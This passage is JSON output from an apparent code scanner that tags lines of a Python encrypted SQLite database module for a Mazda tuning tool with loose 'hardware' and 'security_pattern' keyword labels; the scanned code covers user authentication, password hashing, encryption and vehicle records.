{"type": "hardware", "line": 461, "hardware": "ECU", "content": "cursor.execute(\"PRAGMA foreign_keys = ON\")"}, {"type": "hardware", "line": 465, "hardware": "ECU", "content": "cursor.execute(statement)"}, {"type": "hardware", "line": 468, "hardware": "ECU", "content": "cursor.execute(\"\"\""}, {"type": "hardware", "line": 476, "hardware": "ECU", "content": "cursor.execute(\"SELECT value FROM meta WHERE key = 'schema_version'\")"}, {"type": "hardware", "line": 481, "hardware": "ECU", "content": "cursor.execute("}, {"type": "hardware", "line": 519, "hardware": "ECU", "content": "cursor.execute("}, {"type": "hardware", "line": 548, "hardware": "ECU", "content": "raise SecurityError(\"Failed to decrypt value\")"}, {"type": "hardware", "line": 566, "hardware": "ECU", "content": "raise SecurityError(\"Failed to decrypt JSON data\")"}, {"type": "hardware", "line": 605, "hardware": "ECU", "content": "cursor.execute(\"BEGIN\")"}, {"type": "hardware", "line": 664, "hardware": "ECU", "content": "cursor.execute(\"\"\""}, {"type": "hardware", "line": 685, "hardware": "ECU", "content": "self._log_security_event("}, {"type": "hardware", "line": 686, "hardware": "ECU", "content": "event_type=SecurityEventType.CONFIG_CHANGE,"}, {"type": "hardware", "line": 720, "hardware": "ECU", "content": "cursor.execute("}, {"type": "hardware", "line": 728, "hardware": "ECU", "content": "self._log_security_event("}, {"type": "hardware", "line": 729, "hardware": "ECU", "content": "event_type=SecurityEventType.LOGIN_FAILED,"}, {"type": "hardware", "line": 739, "hardware": "ECU", "content": "self._log_security_event("}, {"type": "hardware", "line": 740, "hardware": "ECU", "content": "event_type=SecurityEventType.LOGIN_FAILED,"}, {"type": "hardware", "line": 749, "hardware": "ECU", "content": "self._log_security_event("}, {"type": "hardware", "line": 750, "hardware": "ECU", "content": "event_type=SecurityEventType.LOGIN_FAILED,"}, {"type": "hardware", "line": 758, "hardware": "ECU", "content": "cursor.execute("}, {"type": "hardware", "line": 767, "hardware": "ECU", "content": "self._log_security_event("}, {"type": "hardware", "line": 768, "hardware": "ECU", "content": "event_type=SecurityEventType.LOGIN,"}, {"type": "hardware", "line": 787, "hardware": "ECU", "content": "cursor.execute("}, {"type": "hardware", "line": 824, "hardware": "ECU", "content": "cursor.execute("}, {"type": "hardware", "line": 907, "hardware": "ECU", "content": "cursor.execute("}, {"type": "hardware", "line": 916, "hardware": "ECU", "content": "self._log_security_event("}, {"type": "hardware", "line": 917, "hardware": "ECU", "content": "event_type=SecurityEventType.CONFIG_CHANGE,"}, {"type": "hardware", "line": 944, "hardware": "ECU", "content": "cursor.execute(\"SELECT username FROM users WHERE id = ?\", (user_id,))"}, {"type": "hardware", "line": 949, "hardware": "ECU", "content": "cursor.execute(\"DELETE FROM users WHERE id = ?\", (user_id,))"}, {"type": "hardware", "line": 955, "hardware": "ECU", "content": "self._log_security_event("}, {"type": "hardware", "line": 956, "hardware": "ECU", "content": "event_type=SecurityEventType.CONFIG_CHANGE,"}, {"type": "hardware", "line": 971, "hardware": "vehicle", "content": "def add_vehicle("}, {"type": "hardware", "line": 982, "hardware": "vehicle", "content": "Add a new vehicle to the database."}, {"type": "hardware", "line": 985, "hardware": "vehicle", "content": "vin: Vehicle Identification Number"}, {"type": "hardware", "line": 986, "hardware": "vehicle", "content": "make: Vehicle make (e.g., \"Mazda\")"}, {"type": "hardware", "line": 987, "hardware": "vehicle", "content": "model: Vehicle model (e.g., \"MX-5\")"}, {"type": "hardware", "line": 990, "hardware": "vehicle", "content": "owner_id: ID of the user who owns this vehicle"}, {"type": "hardware", "line": 991, "hardware": "vehicle", "content": "notes: Optional notes about the vehicle"}, {"type": "hardware", "line": 994, "hardware": "vehicle", "content": "The ID of the newly created vehicle record"}, {"type": "hardware", "line": 1001, "hardware": "ECU", "content": "cursor.execute(\"\"\""}, {"type": "hardware", "line": 1002, "hardware": "vehicle", "content": "INSERT INTO vehicles ("}, {"type": "hardware", "line": 1017, "hardware": "vehicle", "content": "vehicle_id = cursor.lastrowid"}, {"type": "hardware", "line": 1020, "hardware": "ECU", "content": "self._log_security_event("}, {"type": "hardware", "line": 1021, "hardware": "ECU", "content": "event_type=SecurityEventType.DATA_MODIFICATION,"}, {"type": "hardware", "line": 1022, "hardware": "vehicle", "content": "description=f\"Added vehicle: {make} {model} ({vin})\","}, {"type": "hardware", "line": 1026, "hardware": "vehicle", "content": "return vehicle_id"}, {"type": "hardware", "line": 1029, "hardware": "vehicle", "content": "if \"UNIQUE constraint failed: vehicles.vin\" in str(e):"}, {"type": "hardware", "line": 1030, "hardware": "vehicle", "content": "raise DatabaseError(f\"Vehicle with VIN '{vin}' already exists\") from e"}, {"type": "hardware", "line": 1031, "hardware": "vehicle", "content": "raise DatabaseError(f\"Failed to add vehicle: {e}\") from e"}, {"type": "hardware", "line": 1033, "hardware": "vehicle", "content": "raise DatabaseError(f\"Failed to add vehicle: {e}\") from e"}, {"type": "hardware", "line": 1035, "hardware": "vehicle", "content": "def get_vehicle(self, vehicle_id: int) -> Optional[Vehicle]:"}, {"type": "hardware", "line": 1037, "hardware": "vehicle", "content": "Get a vehicle by ID."}, {"type": "hardware", "line": 1040, "hardware": "vehicle", "content": "vehicle_id: ID of the vehicle to retrieve"}, {"type": "hardware", "line": 1043, "hardware": "vehicle", "content": "Vehicle object if found, None otherwise"}, {"type": "hardware", "line": 1050, "hardware": "ECU", "content": "cursor.execute(\"\"\""}, {"type": "hardware", "line": 1052, "hardware": "vehicle", "content": "FROM vehicles WHERE id = ?"}, {"type": "hardware", "line": 1053, "hardware": "vehicle", "content": "\"\"\", (vehicle_id,))"}, {"type": "hardware", "line": 1059, "hardware": "vehicle", "content": "return Vehicle("}, {"type": "hardware", "line": 1073, "hardware": "vehicle", "content": "logger.error(f\"Failed to get vehicle: {e}\")"}, {"type": "hardware", "line": 1076, "hardware": "vehicle", "content": "def get_vehicles_by_owner(self, owner_id: int) -> List[Vehicle]:"}, {"type": "hardware", "line": 1078, "hardware": "vehicle", "content": "Get all vehicles owned by a user."}, {"type": "hardware", "line": 1084, "hardware": "vehicle", "content": "List of Vehicle objects"}, {"type": "hardware", "line": 1091, "hardware": "ECU", "content": "cursor.execute(\"\"\""}, {"type": "hardware", "line": 1093, "hardware": "vehicle", "content": "FROM vehicles WHERE owner_id = ?"}, {"type": "hardware", "line": 1097, "hardware": "vehicle", "content": "vehicles = []"}, {"type": "hardware", "line": 1099, "hardware": "vehicle", "content": "vehicles.append(Vehicle("}, {"type": "hardware", "line": 1112, "hardware": "vehicle", "content": "return vehicles"}, {"type": "hardware", "line": 1115, "hardware": "vehicle", "content": "logger.error(f\"Failed to get vehicles by owner: {e}\")"}, {"type": "hardware", "line": 1118, "hardware": "vehicle", "content": "def update_vehicle(self, vehicle_id: int, **updates) -> bool:"}, {"type": "hardware", "line": 1120, "hardware": "vehicle", "content": "Update vehicle information."}, {"type": "hardware", "line": 1123, "hardware": "vehicle", "content": "vehicle_id: ID of the vehicle to update"}, {"type": "hardware", "line": 1159, "hardware": "vehicle", "content": "params.append(vehicle_id)"}, {"type": "hardware", "line": 1162, "hardware": "ECU", "content": "cursor.execute("}, {"type": "hardware", "line": 1163, "hardware": "vehicle", "content": "f\"UPDATE vehicles SET {set_clause} WHERE id = ?\","}, {"type": "hardware", "line": 1171, "hardware": "ECU", "content": "self._log_security_event("}, {"type": "hardware", "line": 1172, "hardware": "ECU", "content": "event_type=SecurityEventType.DATA_MODIFICATION,"}, {"type": "hardware", "line": 1173, "hardware": "vehicle", "content": "description=f\"Updated vehicle: {vehicle_id}\","}, {"type": "hardware", "line": 1180, "hardware": "vehicle", "content": "if \"UNIQUE constraint failed: vehicles.vin\" in str(e):"}, {"type": "hardware", "line": 1181, "hardware": "vehicle", "content": "raise DatabaseError(\"A vehicle with this VIN already exists\") from e"}, {"type": "hardware", "line": 1182, "hardware": "vehicle", "content": "raise DatabaseError(f\"Failed to update vehicle: {e}\") from e"}, {"type": "hardware", "line": 1184, "hardware": "vehicle", "content": "logger.error(f\"Failed to update vehicle: {e}\")"}, {"type": "hardware", "line": 1187, "hardware": "vehicle", "content": "def delete_vehicle(self, vehicle_id: int) -> bool:"}, {"type": "hardware", "line": 1189, "hardware": "vehicle", "content": "Delete a vehicle and all associated data."}, {"type": "hardware", "line": 1192, "hardware": "vehicle", "content": "vehicle_id: ID of the vehicle to delete"}, {"type": "hardware", "line": 1203, "hardware": "ECU", "content": "cursor.execute(\"SELECT make, model, vin FROM vehicles WHERE id = ?\", (vehicle_id,))"}, {"type": "hardware", "line": 1203, "hardware": "vehicle", "content": "cursor.execute(\"SELECT make, model, vin FROM vehicles WHERE id = ?\", (vehicle_id,))"}, {"type": "hardware", "line": 1212, "hardware": "ECU", "content": "cursor.execute(\"DELETE FROM vehicles WHERE id = ?\", (vehicle_id,))"}, {"type": "hardware", "line": 1212, "hardware": "vehicle", "content": "cursor.execute(\"DELETE FROM vehicles WHERE id = ?\", (vehicle_id,))"}, {"type": "hardware", "line": 1218, "hardware": "ECU", "content": "self._log_security_event("}, {"type": "hardware", "line": 1219, "hardware": "ECU", "content": "event_type=SecurityEventType.DATA_MODIFICATION,"}, {"type": "hardware", "line": 1220, "hardware": "vehicle", "content": "description=f\"Deleted vehicle: {make} {model} ({vin})\","}, {"type": "hardware", "line": 1221, "hardware": "vehicle", "content": "details={\"vehicle_id\": vehicle_id}"}, {"type": "hardware", "line": 1227, "hardware": "vehicle", "content": "logger.error(f\"Failed to delete vehicle: {e}\")"}, {"type": "hardware", "line": 1233, "hardware": "vehicle", "content": "vehicle_id: int,"}, {"type": "hardware", "line": 1243, "hardware": "vehicle", "content": "vehicle_id: ID of the vehicle being tuned"}, {"type": "hardware", "line": 1262, "hardware": "ECU", "content": "cursor.execute(\"\"\""}, {"type": "hardware", "line": 1264, "hardware": "vehicle", "content": "vehicle_id, tuner_id, start_time, description,"}, {"type": "hardware", "line": 1268, "hardware": "vehicle", "content": "vehicle_id,"}, {"type": "hardware", "line": 1280, "hardware": "ECU", "content": "self._log_security_event("}, {"type": "hardware", "line": 1281, "hardware": "ECU", "content": "event_type=SecurityEventType.DATA_MODIFICATION,"}, {"type": "hardware", "line": 1285, "hardware": "vehicle", "content": "\"vehicle_id\": vehicle_id,"}, {"type": "hardware", "line": 1311, "hardware": "ECU", "content": "cursor.execute(\"\"\""}, {"type": "hardware", "line": 1312, "hardware": "vehicle", "content": "SELECT id, vehicle_id, tuner_id, start_time, end_time,"}, {"type": "hardware", "line": 1327, "hardware": "vehicle", "content": "vehicle_id=result[1],"}, {"type": "hardware", "line": 1343, "hardware": "vehicle", "content": "vehicle_id: Optional[int] = None,"}, {"type": "hardware", "line": 1353, "hardware": "vehicle", "content": "vehicle_id: Filter by vehicle ID"}, {"type": "hardware", "line": 1369, "hardware": "vehicle", "content": "SELECT id, vehicle_id, tuner_id, start_time, end_time,"}, {"type": "hardware", "line": 1378, "hardware": "vehicle", "content": "if vehicle_id is not None:"}, {"type": "hardware", "line": 1379, "hardware": "vehicle", "content": "query += \" AND vehicle_id = ?\""}, {"type": "hardware", "line": 1380, "hardware": "vehicle", "content": "params.append(vehicle_id)"}, {"type": "hardware", "line": 1395, "hardware": "ECU", "content": "cursor.execute(query, params)"}, {"type": "hardware", "line": 1405, "hardware": "vehicle", "content": "vehicle_id=row[1],"}, {"type": "hardware", "line": 1475, "hardware": "ECU", "content": "cursor.execute("}, {"type": "hardware", "line": 1484, "hardware": "ECU", "content": "self._log_security_event("}, {"type": "hardware", "line": 1485, "hardware": "ECU", "content": "event_type=SecurityEventType.DATA_MODIFICATION,"}, {"type": "hardware", "line": 1528, "hardware": "ECU", "content": "cursor.execute(\"\"\""}, {"type": "hardware", "line": 1531, "hardware": "vehicle", "content": "JOIN vehicles v ON ts.vehicle_id = v.id"}, {"type": "hardware", "line": 1542, "hardware": "ECU", "content": "cursor.execute(\"DELETE FROM tune_sessions WHERE id = ?\", (session_id,))"}, {"type": "hardware", "line": 1548, "hardware": "ECU", "content": "self._log_security_event("}, {"type": "hardware", "line": 1549, "hardware": "ECU", "content": "event_type=SecurityEventType.DATA_MODIFICATION,"}, {"type": "hardware", "line": 1553, "hardware": "vehicle", "content": "\"vehicle\": f\"{make} {model} ({vin})\""}, {"type": "hardware", "line": 1601, "hardware": "ECU", "content": "cursor.execute(\"\"\""}, {"type": "hardware", "line": 1617, "hardware": "ECU", "content": "self._log_security_event("}, {"type": "hardware", "line": 1618, "hardware": "ECU", "content": "event_type=SecurityEventType.DATA_ACCESS,"}, {"type": "hardware", "line": 1702, "hardware": "ECU", "content": "cursor.execute(query, params)"}, {"type": "hardware", "line": 1781, "hardware": "ECU", "content": "cursor.execute(query, params)"}, {"type": "hardware", "line": 1786, "hardware": "ECU", "content": "self._log_security_event("}, {"type": "hardware", "line": 1787, "hardware": "ECU", "content": "event_type=SecurityEventType.DATA_MODIFICATION,"}, {"type": "hardware", "line": 1805, "hardware": "ECU", "content": "def _log_security_event("}, {"type": "hardware", "line": 1807, "hardware": "ECU", "content": "event_type: Union[SecurityEventType, str],"}, {"type": "hardware", "line": 1814, "hardware": "ECU", "content": "Internal method to log security events."}, {"type": "hardware", "line": 1817, "hardware": "ECU", "content": "event_type: Type of security event"}, {"type": "hardware", "line": 1830, "hardware": "ECU", "content": "event_type = SecurityEventType(event_type.lower())"}, {"type": "hardware", "line": 1839, "hardware": "ECU", "content": "cursor.execute(\"\"\""}, {"type": "hardware", "line": 1840, "hardware": "ECU", "content": "INSERT INTO security_logs ("}, {"type": "hardware", "line": 1856, "hardware": "ECU", "content": "logger.error(f\"Failed to log security event: {e}\")"}, {"type": "hardware", "line": 1859, "hardware": "ECU", "content": "def get_security_logs("}, {"type": "hardware", "line": 1861, "hardware": "ECU", "content": "event_type: Optional[Union[SecurityEventType, str]] = None,"}, {"type": "hardware", "line": 1868, "hardware": "ECU", "content": ") -> List[SecurityLog]:"}, {"type": "hardware", "line": 1870, "hardware": "ECU", "content": "Get security logs with optional filters."}, {"type": "hardware", "line": 1882, "hardware": "ECU", "content": "List of SecurityLog objects"}, {"type": "hardware", "line": 1888, "hardware": "ECU", "content": "event_type = SecurityEventType(event_type.lower())"}, {"type": "hardware", "line": 1896, "hardware": "ECU", "content": "FROM security_logs"}, {"type": "hardware", "line": 1928, "hardware": "ECU", "content": "cursor.execute(query, params)"}, {"type": "hardware", "line": 1936, "hardware": "ECU", "content": "logs.append(SecurityLog("}, {"type": "hardware", "line": 1939, "hardware": "ECU", "content": "event_type=SecurityEventType(row[2]),"}, {"type": "hardware", "line": 1949, "hardware": "ECU", "content": "logger.error(f\"Failed to get security logs: {e}\")"}, {"type": "hardware", "line": 1968, "hardware": "ABS", "content": "backup_dir = os.path.dirname(os.path.abspath(backup_path))"}, {"type": "hardware", "line": 2085, "hardware": "ECU", "content": "\"\"\"Example of how to use the SecureDatabase class.\"\"\""}, {"type": "hardware", "line": 2087, "hardware": "ECU", "content": "db = SecureDatabase(\"secure_tunes.db\", encryption_key=b\"your-secret-key-here\")"}, {"type": "hardware", "line": 2093, "hardware": "ECU", "content": "password=\"securepassword123\","}, {"type": "hardware", "line": 2102, "hardware": "vehicle", "content": "vehicle_id = db.add_vehicle("}, {"type": "hardware", "line": 2111, "hardware": "vehicle", "content": "print(f\"Added vehicle with ID: {vehicle_id}\")"}, {"type": "hardware", "line": 2115, "hardware": "vehicle", "content": "vehicle_id=vehicle_id,"}, {"type": "hardware", "line": 2117, "hardware": "ECU", "content": "description=\"ECU remap stage 1\","}, {"type": "hardware", "line": 2135, "hardware": "vehicle", "content": "sessions = db.get_tune_sessions(vehicle_id=vehicle_id)"}, {"type": "hardware", "line": 2152, "hardware": "ECU", "content": "security_logs = db.get_security_logs(limit=5)"}, {"type": "hardware", "line": 2153, "hardware": "ECU", "content": "print(\"\\nRecent security events:\")"}, {"type": "hardware", "line": 2154, "hardware": "ECU", "content": "for log in security_logs:"}], "security_logic": [{"type": "security_pattern", "line": 2, "pattern": "encrypt", "content": "SecureDatabase - Encrypted SQLite database for MUTS (Mazda Universal Tuning System)."}, {"type": "security_pattern", "line": 4, "pattern": "encrypt", "content": "This module provides a secure, encrypted SQLite database with tables for users, vehicles,"}, {"type": "security_pattern", "line": 5, "pattern": "encrypt", "content": "tuning sessions, diagnostic logs, and security events. All sensitive data is encrypted"}, {"type": "security_pattern", "line": 14, "pattern": "hash", "content": "import hashlib"}, {"type": "security_pattern", "line": 26, "pattern": "hash", "content": "from cryptography.hazmat.primitives import hashes"}, {"type": "security_pattern", "line": 30, "pattern": "algorithm", "content": "from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes"}, {"type": "security_pattern", "line": 30, "pattern": "cipher", "content": "from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes"}, {"type": "security_pattern", "line": 68, "pattern": "password", "content": "PASSWORD_CHANGE = \"password_change\""}, {"type": "security_pattern", "line": 296, "pattern": "encrypt", "content": "\"\"\"Secure SQLite database with encryption for sensitive data.\"\"\""}, {"type": "security_pattern", "line": 305, "pattern": "key", "content": "key TEXT PRIMARY KEY,"}, {"type": "security_pattern", "line": 311, "pattern": "key", "content": "id INTEGER PRIMARY KEY AUTOINCREMENT,"}, {"type": "security_pattern", "line": 314, "pattern": "password", "content": "password_hash TEXT NOT NULL,"}, {"type": "security_pattern", "line": 314, "pattern": "hash", "content": "password_hash TEXT NOT NULL,"}, {"type": "security_pattern", "line": 315, "pattern": "password", "content": "password_salt TEXT NOT NULL,"}, {"type": "security_pattern", "line": 327, "pattern": "key", "content": "id INTEGER PRIMARY KEY AUTOINCREMENT,"}, {"type": "security_pattern", "line": 337, "pattern": "key", "content": "FOREIGN KEY (owner_id) REFERENCES users (id) ON DELETE CASCADE"}, {"type": "security_pattern", "line": 342, "pattern": "key", "content": "id INTEGER PRIMARY KEY AUTOINCREMENT,"}, {"type": "security_pattern", "line": 349, "pattern": "encrypt", "content": "config_encrypted BLOB,"}, {"type": "security_pattern", "line": 351, "pattern": "key", "content": "FOREIGN KEY (vehicle_id) REFERENCES vehicles (id) ON DELETE CASCADE,"}, {"type": "security_pattern", "line": 352, "pattern": "key", "content": "FOREIGN KEY (tuner_id) REFERENCES users (id) ON DELETE CASCADE"}, {"type": "security_pattern", "line": 357, "pattern": "key", "content": "id INTEGER PRIMARY KEY AUTOINCREMENT,"}, {"type": "security_pattern", "line": 363, "pattern": "encrypt", "content": "data_encrypted BLOB,"}, {"type": "security_pattern", "line": 364, "pattern": "key", "content": "FOREIGN KEY (session_id) REFERENCES tune_sessions (id) ON DELETE CASCADE"}, {"type": "security_pattern", "line": 369, "pattern": "key", "content": "id INTEGER PRIMARY KEY AUTOINCREMENT,"}, {"type": "security_pattern", "line": 375, "pattern": "encrypt", "content": "details_encrypted BLOB,"}, {"type": "security_pattern", "line": 376, "pattern": "key", "content": "FOREIGN KEY (user_id) REFERENCES users (id) ON DELETE SET NULL"}, {"type": "security_pattern", "line": 389, "pattern": "key", "content": "def __init__(self, db_path: str, encryption_key: Optional[bytes] = None):"}, {"type": "security_pattern", "line": 389, "pattern": "encrypt", "content": "def __init__(self, db_path: str, encryption_key: Optional[bytes] = None):"}, {"type": "security_pattern", "line": 395, "pattern": "key", "content": "encryption_key: Optional Fernet key for encryption. If not provided, a new key will be generated."}, {"type": "security_pattern", "line": 395, "pattern": "encrypt", "content": "encryption_key: Optional Fernet key for encryption. If not provided, a new key will be generated."}, {"type": "security_pattern", "line": 402, "pattern": "key", "content": "self._init_encryption(encryption_key)"}, {"type": "security_pattern", "line": 402, "pattern": "encrypt", "content": "self._init_encryption(encryption_key)"}, {"type": "security_pattern", "line": 411, "pattern": "key", "content": "def _init_encryption(self, encryption_key: Optional[bytes] = None) -> None:"}, {"type": "security_pattern", "line": 411, "pattern": "encrypt", "content": "def _init_encryption(self, encryption_key: Optional[bytes] = None) -> None:"}, {"type": "security_pattern", "line": 412, "pattern": "encrypt", "content": "\"\"\"Initialize encryption components.\"\"\""}, {"type": "security_pattern", "line": 413, "pattern": "key", "content": "if encryption_key:"}, {"type": "security_pattern", "line": 413, "pattern": "encrypt", "content": "if encryption_key:"}, {"type": "security_pattern", "line": 414, "pattern": "key", "content": "if not isinstance(encryption_key, bytes):"}, {"type": "security_pattern", "line": 414, "pattern": "encrypt", "content": "if not isinstance(encryption_key, bytes):"}, {"type": "security_pattern", "line": 415, "pattern": "key", "content": "raise ValueError(\"Encryption key must be bytes\")"}, {"type": "security_pattern", "line": 415, "pattern": "encrypt", "content": "raise ValueError(\"Encryption key must be bytes\")"}, {"type": "security_pattern", "line": 416, "pattern": "key", "content": "self._encryption_key = encryption_key"}, {"type": "security_pattern", "line": 416, "pattern": "encrypt", "content": "self._encryption_key = encryption_key"}, {"type": "security_pattern", "line": 419, "pattern": "key", "content": "self._encryption_key = Fernet.generate_key()"}, {"type": "security_pattern", "line": 419, "pattern": "encrypt", "content": "self._encryption_key = Fernet.generate_key()"}, {"type": "security_pattern", "line": 420, "pattern": "key", "content": "logger.warning(\"No encryption key provided, using a newly generated key\")"}, {"type": "security_pattern", "line": 420, "pattern": "encrypt", "content": "logger.warning(\"No encryption key provided, using a newly generated key\")"}, {"type": "security_pattern", "line": 422, "pattern": "key", "content": "self._fernet = Fernet(self._encryption_key)"}, {"type": "security_pattern", "line": 422, "pattern": "encrypt", "content": "self._fernet = Fernet(self._encryption_key)"}, {"type": "security_pattern", "line": 435, "pattern": "key", "content": "self.connection.execute(\"PRAGMA foreign_keys = ON\")"}, {"type": "security_pattern", "line": 443, "pattern": "encrypt", "content": "self.connection.create_function(\"ENCRYPT\", 1, self._encrypt_value)"}, {"type": "security_pattern", "line": 444, "pattern": "decrypt", "content": "self.connection.create_function(\"DECRYPT\", 1, self._decrypt_value)"}, {"type": "security_pattern", "line": 461, "pattern": "key", "content": "cursor.execute(\"PRAGMA foreign_keys = ON\")"}, {"type": "security_pattern", "line": 470, "pattern": "key", "content": "key TEXT PRIMARY KEY,"}, {"type": "security_pattern", "line": 476, "pattern": "key", "content": "cursor.execute(\"SELECT value FROM meta WHERE key = 'schema_version'\")"}, {"type": "security_pattern", "line": 482, "pattern": "key", "content": "\"INSERT INTO meta (key, value) VALUES (?, ?)\","}, {"type": "security_pattern", "line": 520, "pattern": "key", "content": "\"UPDATE meta SET value = ? WHERE key = 'schema_version'\","}, {"type": "security_pattern", "line": 532, "pattern": "encrypt", "content": "def _encrypt_value(self, value: str) -> bytes:"}, {"type": "security_pattern", "line": 533, "pattern": "encrypt", "content": "\"\"\"Encrypt a string value.\"\"\""}, {"type": "security_pattern", "line": 538, "pattern": "encrypt", "content": "return self._fernet.encrypt(value.encode('utf-8'))"}, {"type": "security_pattern", "line": 540, "pattern": "encrypt", "content": "def _decrypt_value(self, encrypted: bytes) -> str:"}, {"type": "security_pattern", "line": 540, "pattern": "decrypt", "content": "def _decrypt_value(self, encrypted: bytes) -> str:"}, {"type": "security_pattern", "line": 541, "pattern": "encrypt", "content": "\"\"\"Decrypt an encrypted value to a string.\"\"\""}, {"type": "security_pattern", "line": 541, "pattern": "decrypt", "content": "\"\"\"Decrypt an encrypted value to a string.\"\"\""}, {"type": "security_pattern", "line": 542, "pattern": "encrypt", "content": "if encrypted is None:"}, {"type": "security_pattern", "line": 545, "pattern": "encrypt", "content": "return self._fernet.decrypt(encrypted).decode('utf-8')"}, {"type": "security_pattern", "line": 545, "pattern": "decrypt", "content": "return self._fernet.decrypt(encrypted).decode('utf-8')"}, {"type": "security_pattern", "line": 547, "pattern": "decrypt", "content": "logger.error(f\"Decryption failed: {e}\")"}, {"type": "security_pattern", "line": 548, "pattern": "decrypt", "content": "raise SecurityError(\"Failed to decrypt value\")"}, {"type": "security_pattern", "line": 550, "pattern": "encrypt", "content": "def _encrypt_json(self, data: Dict[str, Any]) -> bytes:"}, {"type": "security_pattern", "line": 551, "pattern": "encrypt", "content": "\"\"\"Encrypt a JSON-serializable dictionary.\"\"\""}, {"type": "security_pattern", "line": 555, "pattern": "encrypt", "content": "return self._fernet.encrypt(json_str.encode('utf-8'))"}, {"type": "security_pattern", "line": 557, "pattern": "encrypt", "content": "def _decrypt_json(self, encrypted: bytes) -> Dict[str, Any]:"}, {"type": "security_pattern", "line": 557, "pattern": "decrypt", "content": "def _decrypt_json(self, encrypted: bytes) -> Dict[str, Any]:"}, {"type": "security_pattern", "line": 558, "pattern": "encrypt", "content": "\"\"\"Decrypt an encrypted JSON string to a dictionary.\"\"\""}, {"type": "security_pattern", "line": 558, "pattern": "decrypt", "content": "\"\"\"Decrypt an encrypted JSON string to a dictionary.\"\"\""}, {"type": "security_pattern", "line": 559, "pattern": "encrypt", "content": "if encrypted is None:"}, {"type": "security_pattern", "line": 562, "pattern": "encrypt", "content": "json_str = self._fernet.decrypt(encrypted).decode('utf-8')"}, {"type": "security_pattern", "line": 562, "pattern": "decrypt", "content": "json_str = self._fernet.decrypt(encrypted).decode('utf-8')"}, {"type": "security_pattern", "line": 565, "pattern": "decrypt", "content": "logger.error(f\"Failed to decrypt JSON: {e}\")"}, {"type": "security_pattern", "line": 566, "pattern": "decrypt", "content": "raise SecurityError(\"Failed to decrypt JSON data\")"}, {"type": "security_pattern", "line": 568, "pattern": "password", "content": "def _hash_password(self, password: str, salt: Optional[bytes] = None) -> Tuple[bytes, bytes]:"}, {"type": "security_pattern", "line": 568, "pattern": "hash", "content": "def _hash_password(self, password: str, salt: Optional[bytes] = None) -> Tuple[bytes, bytes]:"}, {"type": "security_pattern", "line": 569, "pattern": "password", "content": "\"\"\"Hash a password with a salt.\"\"\""}, {"type": "security_pattern", "line": 569, "pattern": "hash", "content": "\"\"\"Hash a password with a salt.\"\"\""}, {"type": "security_pattern", "line": 575, "pattern": "algorithm", "content": "algorithm=hashes.SHA256(),"}, {"type": "security_pattern", "line": 575, "pattern": "hash", "content": "algorithm=hashes.SHA256(),"}, {"type": "security_pattern", "line": 576, "pattern": "key", "content": "length=32,  # 256-bit key"}, {"type": "security_pattern", "line": 583, "pattern": "password", "content": "key = base64.urlsafe_b64encode(kdf.derive(password.encode('utf-8')))"}, {"type": "security_pattern", "line": 583, "pattern": "key", "content": "key = base64.urlsafe_b64encode(kdf.derive(password.encode('utf-8')))"}, {"type": "security_pattern", "line": 584, "pattern": "key", "content": "return key, salt"}, {"type": "security_pattern", "line": 586, "pattern": "password", "content": "def _verify_password(self, password: str, password_hash: bytes, salt: bytes) -> bool:"}, {"type": "security_pattern", "line": 586, "pattern": "hash", "content": "def _verify_password(self, password: str, password_hash: bytes, salt: bytes) -> bool:"}, {"type": "security_pattern", "line": 587, "pattern": "password", "content": "\"\"\"Verify a password against a hash and salt.\"\"\""}, {"type": "security_pattern", "line": 587, "pattern": "hash", "content": "\"\"\"Verify a password against a hash and salt.\"\"\""}, {"type": "security_pattern", "line": 589, "pattern": "password", "content": "new_hash, _ = self._hash_password(password, salt)"}, {"type": "security_pattern", "line": 589, "pattern": "hash", "content": "new_hash, _ = self._hash_password(password, salt)"}, {"type": "security_pattern", "line": 590, "pattern": "password", "content": "return secrets.compare_digest(new_hash, password_hash)"}, {"type": "security_pattern", "line": 590, "pattern": "hash", "content": "return secrets.compare_digest(new_hash, password_hash)"}, {"type": "security_pattern", "line": 592, "pattern": "password", "content": "logger.error(f\"Password verification failed: {e}\")"}, {"type": "security_pattern", "line": 630, "pattern": "password", "content": "password: str,"}, {"type": "security_pattern", "line": 642, "pattern": "password", "content": "password: Plain text password (will be hashed)"}, {"type": "security_pattern", "line": 642, "pattern": "hash", "content": "password: Plain text password (will be hashed)"}, {"type": "security_pattern", "line": 660, "pattern": "password", "content": "password_hash, _ = self._hash_password(password, salt)"}, {"type": "security_pattern", "line": 660, "pattern": "hash", "content": "password_hash, _ = self._hash_password(password, salt)"}, {"type": "security_pattern", "line": 666, "pattern": "password", "content": "username, email, password_hash, password_salt,"}, {"type": "security_pattern", "line": 666, "pattern": "hash", "content": "username, email, password_hash, password_salt,"}, {"type": "security_pattern", "line": 672, "pattern": "password", "content": "password_hash,"}, {"type": "security_pattern", "line": 672, "pattern": "hash", "content": "password_hash,"}, {"type": "security_pattern", "line": 702, "pattern": "password", "content": "def authenticate_user(self, username: str, password: str, ip_address: Optional[str] = None) -> Optio"}, {"type": "security_pattern", "line": 702, "pattern": "authenticate", "content": "def authenticate_user(self, username: str, password: str, ip_address: Optional[str] = None) -> Optio"}, {"type": "security_pattern", "line": 704, "pattern": "password", "content": "Authenticate a user by username and password."}, {"type": "security_pattern", "line": 704, "pattern": "authenticate", "content": "Authenticate a user by username and password."}, {"type": "security_pattern", "line": 708, "pattern": "password", "content": "password: Plain text password"}, {"type": "security_pattern", "line": 721, "pattern": "password", "content": "\"SELECT id, username, password_hash, password_salt, is_active FROM users WHERE username = ?\","}, {"type": "security_pattern", "line": 721, "pattern": "hash", "content": "\"SELECT id, username, password_hash, password_salt, is_active FROM users WHERE username = ?\","}, {"type": "security_pattern", "line": 735, "pattern": "hash", "content": "user_id, db_username, db_hash, db_salt, is_active = result"}, {"type": "security_pattern", "line": 748, "pattern": "password", "content": "if not self._verify_password(password, db_hash, db_salt):"}, {"type": "security_pattern", "line": 748, "pattern": "hash", "content": "if not self._verify_password(password, db_hash, db_salt):"}, {"type": "security_pattern", "line": 751, "pattern": "password", "content": "description=f\"Invalid password for user: {username}\","}, {"type": "security_pattern", "line": 872, "pattern": "password", "content": "'email', 'first_name', 'last_name', 'role', 'is_active', 'password'"}, {"type": "security_pattern", "line": 883, "pattern": "password", "content": "new_password = updates.pop('password', None)"}, {"type": "security_pattern", "line": 886, "pattern": "key", "content": "set_clause = \", \".join(f\"{field} = ?\" for field in updates.keys())"}, {"type": "security_pattern", "line": 890, "pattern": "password", "content": "if new_password:"}, {"type": "security_pattern", "line": 892, "pattern": "password", "content": 